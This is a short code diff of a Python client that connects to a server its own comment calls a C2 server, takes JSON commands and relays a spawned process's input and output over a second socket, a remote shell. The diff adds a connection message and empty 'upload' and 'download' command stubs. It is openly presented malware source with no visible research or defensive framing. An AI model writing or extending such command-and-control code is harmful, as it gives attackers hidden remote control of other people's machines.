@@ -11,6 +11,7 @@ def send_data(conn, data):
 
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
     sock.connect((HOST, PORT)) # Connect to the C2 server
+    print("Connected!!!")
     while True:
         data = json.loads(sock.recv(1024).decode())
         print(data)
@@ -21,3 +22,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                 s.connect((HOST, data[1]))
                 threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
                 threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()
+            case 'upload':
+                pass
+            case 'download':
+                pass
